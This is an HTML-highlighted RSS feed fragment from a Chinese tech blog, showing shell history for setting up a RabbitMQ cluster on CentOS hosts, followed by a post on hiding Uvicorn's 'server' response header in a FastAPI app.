<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> epel</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hostnamectl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set-hostname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit03</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/hosts</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> rabbitmq-server</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -detached</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 400</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 400</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmq-server</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -detached</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">kill</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -9</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1969</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">kill</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -9</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1999</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop_app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reset</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> join_cluster</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ram</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit02</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> firewalld</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> join_cluster</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ram</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit02</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cluster_status</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">history</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> epel</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hostnamectl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set-hostname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit04</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/hosts</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> rabbitmq-server</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -detached</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 400</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmq-server</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -detached</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -name</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.cookie</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">kill</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -9</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1960</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1990</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop_app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> firewalld</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop_app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reset</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> join_cluster</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ram</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit02</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cluster_status</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Uvicorn修改headers内的server名字</title>
      <link>https://www.geekery.cn/note-book/Research_Develop/Python/Uvicorn%E4%BF%AE%E6%94%B9headers%E5%86%85%E7%9A%84server%E5%90%8D%E5%AD%97.html</link>
      <guid>https://www.geekery.cn/note-book/Research_Develop/Python/Uvicorn%E4%BF%AE%E6%94%B9headers%E5%86%85%E7%9A%84server%E5%90%8D%E5%AD%97.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Uvicorn修改headers内的server名字</source>
      <description>Uvicorn修改headers内的server名字 原有的uvicorn的server会显示一些uvicron的信息，这个服务器并不是很专业的web服务器，安全性较低，如何从代码里修改呢？下面是主要的额步骤 举例 剔除 server: uvicorn, 减少信息泄露。 实例代码 然后重启整个uvicorn服务器，自动重新加载无效。 结果 举例 剔除 ...</description>
      <pubDate>Tue, 23 Jul 2024 05:31:26 GMT</pubDate>
      <content:encoded><![CDATA[
<p>原有的uvicorn的server会显示一些uvicron的信息，这个服务器并不是很专业的web服务器，安全性较低，如何从代码里修改呢？下面是主要的额步骤</p>
<h2>举例</h2>
<p>剔除 server: uvicorn, 减少信息泄露。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Response</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> headers</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> content-length:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> content-type:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> application/json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> date:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Thu,10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Aug</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2023</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 05:52:06</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GMT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> server:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> uvicorn</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> # 要剔除这行</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>实例代码</h2>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uvicorn</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> fastapi </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> FastAPI</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> FastAPI</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">    title</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"uvicorn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">    description</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"uvicorn教程"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">    version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"beta 0.1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "__main__"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    uvicorn.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">run</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        "run:app"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        host</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"127.0.0.1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        port</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        log_level</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"info"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        reload</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">True</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        workers</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        debug</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">True</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">        headers</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"server"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"2678885646@qq.com.server"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    )</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后重启整个uvicorn服务器，自动重新加载无效。</p>
<h2>结果</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> content-length:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> content-type:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> application/json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> date:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Thu,10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Aug</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2023</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 05:55:20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GMT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> server:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2678885646@qq.com.server</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>举例</h2>
<p>剔除 server: uvicorn, 减少信息泄露</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Response</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> headers</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> content-length:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> content-type:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> application/json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> date:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Thu,10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Aug</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2023</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 05:52:06</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GMT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> server:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> uvicorn</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> # 要剔除这行</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>实例代码</h2>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uvicorn</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> fastapi </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> FastAPI</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> FastAPI</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span></span>
